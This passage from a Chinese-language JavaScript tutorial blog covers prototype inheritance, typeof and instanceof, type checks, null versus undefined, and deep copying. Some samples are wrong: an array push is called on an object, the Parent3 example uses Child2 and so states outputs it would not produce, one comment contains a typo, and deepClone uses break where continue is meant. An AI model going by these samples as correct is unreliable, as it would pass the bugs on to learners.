class="line"><span class="keyword">new</span> Parent1(); <span class="comment">// Parent1 &#123;name: "parent1"&#125;</span></span><br><span class="line"><span class="keyword">new</span> Child1(); <span class="comment">// Child1 &#123;name: "parent1", type: "child1"&#125;</span></span><br></pre></td></tr></table></figure></p><p>  这个时候我们需要用到原型链的继承，见下文</p><h4 id="借助原型链实现继承"><a href="#借助原型链实现继承" class="headerlink" title="借助原型链实现继承"></a>借助原型链实现继承</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent2'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child2'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child2.prototype = <span class="keyword">new</span> Parent2(); <span class="comment">// 继承的属性或方法挂载在__proto__下</span></span><br></pre></td></tr></table></figure><p>  打印 <code>new Child2()</code> ，结果如下：<br><img src="../images/javascript/js_prototype5.png" width="80%" title="原型链实现继承"></p><p>  原理：在打印 <code>new Child2()</code> 时，先去找自身的属性和方法，然后再去找 <code>new Child2().__proto__</code> ，也就是它的构造函数的 <code>prototype</code> 属性，即 <code>Child2.prototype</code>，而它等于 <code>new Parent2()</code>，所有在 <code>__proto__</code> 属性中我们可以看到 <code>Parent2</code> 的属性和方法。</p><p>  <strong>原型链继承的弊端</strong>：共用地址，如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent2'</span>;</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child2'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child2.prototype = <span class="keyword">new</span> Parent2();</span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> Child2();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> Child2();</span><br><span class="line"><span class="built_in">console</span>.log(s1.value, s2.value); <span class="comment">// [1, 2, 3]、[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">s1.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(s1.value, s2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure></p><p>  即修改其中一个实例的值时，其他的实例会同时改变，因为它们有共同的 <code>__proto__</code> 属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s1.__proto__ === s2.__proto__; <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h4 id="组合方法（构造函数-原型链）"><a href="#组合方法（构造函数-原型链）" class="headerlink" title="组合方法（构造函数 + 原型链）"></a>组合方法（构造函数 + 原型链）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent3'</span>;</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent3.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child3'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child3.prototype = <span class="keyword">new</span> Parent3();</span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> Child2();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> Child2();</span><br><span class="line">s1.value.push(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1.value, s2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>  可以发现，组合方式创建的实例是相互独立的。</p><p>  改方法的弊端：父类的构造函数会被执行两次，一次 <code>Parent3.call</code>，一次 <code>new Parent3()</code>，造成浪费。</p><h4 id="组合优化1"><a href="#组合优化1" class="headerlink" title="组合优化1"></a>组合优化1</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent4</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent3'</span>;</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child4</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent4.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child4'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child4.prototype = Parent4.prototype; <span class="comment">// 直接把父类的原型对象赋给子类的原型对象</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> Child4();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> Child4();</span><br><span class="line">s1.value.push(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1.value, s2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>  这种情况我们无法判断 <code>s1</code> 是 <code>Child</code> 的实例还是 <code>Parent</code> 的实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A instanceof B 表示 A 是否是 B 的实例</span></span><br><span class="line">s1 <span class="keyword">instanceof</span> Child4; <span class="comment">// true</span></span><br><span class="line">s1 <span class="keyword">instanceof</span> Parent4; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// A.constructor</span></span><br><span class="line">s1.constructor; <span class="comment">// 构造函数是Parent4</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ƒ Parent4() &#123;</span></span><br><span class="line"><span class="comment">  this.name = 'parent3';</span></span><br><span class="line"><span class="comment">  this.value = [1, 2, 3];</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></p><h4 id="组合优化2"><a href="#组合优化2" class="headerlink" title="组合优化2"></a>组合优化2</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent5</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent5'</span>;</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child5</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent5.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child5'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child5.prototype = <span class="built_in">Object</span>.create(Parent5.prototype); </span><br><span class="line"><span class="comment">// 该方法创建一个新对象，并使用现有的对象来提供新创建的对象的__proto__，可理解为浅拷贝</span></span><br><span class="line">Child5.prototype.constructor = Child5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> Child5();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> Child5();</span><br><span class="line">s1.value.push(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1.value, s2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3] </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1 <span class="keyword">instanceof</span> Child5); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(s1 <span class="keyword">instanceof</span> Parent5); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(s1.constructor); <span class="comment">// 可以看到s1的构造函数已经指向Child5了</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ƒ Child5()&#123;</span></span><br><span class="line"><span class="comment">  Parent5.call(this);</span></span><br><span class="line"><span class="comment">  this.type = 'child5';</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><hr><h2 id="typeof-和-instanceof"><a href="#typeof-和-instanceof" class="headerlink" title="typeof 和 instanceof"></a>typeof 和 instanceof</h2><p>JavaScript常使用 <code>typeof</code> 和 <code>instanceof</code> 来判断一个变量是否为空或者是什么类型。</p><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><p>  typeof的定义和用法：返回值是一个字符串，用来说明变量的数据类型。</p><ol><li><code>typeof</code> 一般返回：<code>undefined</code>、<code>boolean</code>、<code>string</code>、<code>number</code>、<code>function</code>、<code>object</code>，注意不等同于js的基本类型<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>; <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>; <span class="comment">// 'boolean'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">'abc'</span>; <span class="comment">// 'string'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">123</span>; <span class="comment">// 'number'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> []; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125;; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Object</span>; <span class="comment">// 'funciton'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Array</span>; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">console</span>.log; <span class="comment">// 'function'</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>获取一个变量是否存在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> a !== <span class="string">'undefined'</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>而不要使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a) &#123;&#125;</span><br></pre></td></tr></table></figure><p>a如果不存在（未申明）时会报错。</p></li><li><p>对于 <code>Array</code>, <code>Null</code> 等特殊对象使用 <code>typeof</code> 一律返回 <code>object</code>，这正是 <code>typeof</code> 的局限性，可以借助 <code>instanceof</code></p></li></ol><h3 id="instanceOf"><a href="#instanceOf" class="headerlink" title="instanceOf"></a>instanceOf</h3><p>  instanceof定义和用法：<code>instanceof</code> 用于判断一个变量是否属于某个对象的实例。<br>  注：不能检测 <code>null</code> 和 <code>undefined</code>。</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a <span class="keyword">instanceof</span> b ? alert(<span class="string">"true"</span>):alert(<span class="string">"false"</span>); <span class="comment">// a是b的实例 ？真 : 假</span></span><br></pre></td></tr></table></figure>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line">alert(a <span class="keyword">instanceof</span> <span class="built_in">Array</span>);  <span class="comment">// true</span></span><br><span class="line">alert(a <span class="keyword">instanceof</span> <span class="built_in">Object</span>);  <span class="comment">// true，因为数组是对象的实例</span></span><br></pre></td></tr></table></figure>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> test(); <span class="comment">// a是一个实例</span></span><br><span class="line">alert(a <span class="keyword">instanceof</span> test); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> Null;</span><br><span class="line"><span class="literal">undefined</span> <span class="keyword">instanceof</span> Undefined;</span><br></pre></td></tr></table></figure><hr><h2 id="js检测一个变量是String类型"><a href="#js检测一个变量是String类型" class="headerlink" title="js检测一个变量是String类型"></a>js检测一个变量是String类型</h2><ol><li><p>es5方法</p><ul><li><p>方法1：typeof</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> str === <span class="string">'string'</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法2：constructor</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.constructor === <span class="built_in">String</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法3：Object.prototype.toString.call</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(str) === <span class="string">'[object String]'</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓展：</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">1</span>); <span class="comment">// '[object Number]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">''</span>); <span class="comment">// '[object String]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([]); <span class="comment">// '[object Array]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;&#125;); <span class="comment">// '[object Object]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>); <span class="comment">// '[object Boolean]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>); <span class="comment">// '[object Null]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>); <span class="comment">// '[object Undefined]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;); <span class="comment">// '[object Function]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>()); <span class="comment">// '[object Date]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">RegExp</span>()); <span class="comment">// '[object RegExp]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Error</span>()); <span class="comment">// '[object Error]'</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="js检测一个变量是Array类型"><a href="#js检测一个变量是Array类型" class="headerlink" title="js检测一个变量是Array类型"></a>js检测一个变量是Array类型</h2><ol><li><p>es5方式</p><ul><li><p>方法1：instanceof</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr <span class="keyword">instanceof</span> <span class="built_in">Array</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法2：constrctor</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.constructor === <span class="built_in">Array</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法3：Object.prototype.toString.call（推荐使用此方法）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(arr) === <span class="string">'[object Array]'</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法4：Object.getPrototypeOf()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.getPrototypeOf(arr) === <span class="built_in">Array</span>.prototype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法5：Array.prototype.isPrototypeOf()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.isPrototypeOf(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>注：实际上，除了 <code>Object.prototype.toString.call</code> 这个方法，其余的方法并不绝对正确。如下，使用其他四种方法输出的都是 <code>true</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  __proto__: <span class="built_in">Array</span>.prototype</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们只是手动指定了某个对象的 <code>__proto__</code> 属性为 <code>Array.prototype</code>，便导致了该对象继承了 <code>Array</code> 对象，这种毫不负责任的继承方式，使得基于继承的判断方案瞬间土崩瓦解。</p><blockquote><p>参考：<a href="https://www.jianshu.com/p/602de7ce76e7" target="_blank" rel="noopener">简书 判断变量是否为数组</a></p></blockquote></li><li><p>es6方式</p><ul><li>方法1：isArray方法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.isArray(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="null-和-undefined的区别"><a href="#null-和-undefined的区别" class="headerlink" title="null 和 undefined的区别"></a>null 和 undefined的区别</h2><ol><li><p>实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> == <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>定义：</p><ul><li>null: Null类型，代表“空值”，代表一个空对象指针，不指向任何对象地址。</li><li>undefined: Undefined类型，当一个声明了一个变量未初始化时，得到的就是 <code>undefined</code>。</li></ul></li><li><p>何时使用 <code>null</code> ?<br>当使用完一个比较大的对象时，需要对其进行释放内存时，设置为null，这样方便垃圾回收。</p></li></ol><hr><h2 id="js浅拷贝和深拷贝（针对引用类型数据Object）"><a href="#js浅拷贝和深拷贝（针对引用类型数据Object）" class="headerlink" title="js浅拷贝和深拷贝（针对引用类型数据Object）"></a>js浅拷贝和深拷贝（针对引用类型数据Object）</h2><ol><li><p>浅拷贝：重新在堆内存中开辟一个空间，拷贝后新对象获得独立的基本数据类型数据，和原对象共用引用类型数据。<br><strong>浅拷贝的实现方式</strong>：</p><ul><li><code>Object.assign()</code>; 需注意的是目标对象只有一层的时候，是深拷贝</li><li><code>Array.prototype.concat()</code>;</li><li><code>Array.prototype.slice()</code>;</li><li><code>$.extend({}, {})</code>; 默认浅拷贝</li></ul></li><li><p>深拷贝：将数据的基本数据类型和引用类型都拷贝一份，在内存中存在两个数据结构完全相同但是又互相独立的数据。<br><strong>深拷贝的实现方式</strong>：</p><ul><li>热门库 <code>lodash</code> 提供了一个 <code>_.cloneDeep</code> 的方法;</li><li><code>jQuery</code> 提供了一个 <code>$.extend(true, {}, {})</code>， 默认是浅拷贝（第一个参数不传），第一个传输传true为深拷贝;</li><li><code>JSON.parse(JSON.stringify())</code>; 无法复制内部的函数</li><li>手写递归方法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现深度克隆--只考虑对象/数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">target</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="built_in">Array</span>.isArray(target) ? [] : &#123;&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 数组和对象的typeof 都是object（此处巧妙使用了typeof，也可以使用Object.prototype.toString.call(target).slice(8, -1)来取到类型Object或Array）</span></span><br><span class="line">  <span class="keyword">if</span> (target &amp;&amp; <span class="keyword">typeof</span> target === <span class="string">'object'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历目标数据(for...in可以遍历对象和数组，后例会介绍其用法)</span></span><br><span class="line">    <span class="comment">// target为数组时，i表示索引；为对象时，i表示key</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> target) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 只处理自由属性</span></span><br><span class="line">      <span class="keyword">if</span> (!target.hasOwnProperty(i)) <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 判断目标结构中的每一项是否存在对象/数组，决定是否需要递归下去</span></span><br><span class="line">      <span class="keyword">if</span> (target[i] &amp;&amp; <span class="keyword">typeof</span> target[i] === <span class="string">'object'</span>) &#123;</span><br><span class="line">        result[i] = deepClone(target[i]); <span class="comment">// 子属性仍是对象或数组，则递归执行</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result[i] = target[i]; <span class="comment">// 不需要递归，value已经能是基本的数据类型</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试：</span></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: &#123;<span class="attr">c</span>: <span class="number">2</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> B = deepClone(A);</span><br><span class="line"></span><br><span class="line">A.b.c = <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(A); <span class="comment">// &#123;a: 1, b: &#123;c: 22&#125;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(B); <span class="comment">// &#123;a: 1, b: &#123;c: 2&#125;&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="js实现map、filter、reduce高阶函数"><a href="#js实现map、filter、reduce高阶函数" class="headerlink" title="js实现map、filter、reduce高阶函数"></a>js实现map、filter、reduce高阶函数</h2><h3 id="js实现map方法"><a href="#js实现map方法" class="headerlink" title="js实现map方法"></a>js实现map方法</h3><figure class="highlight 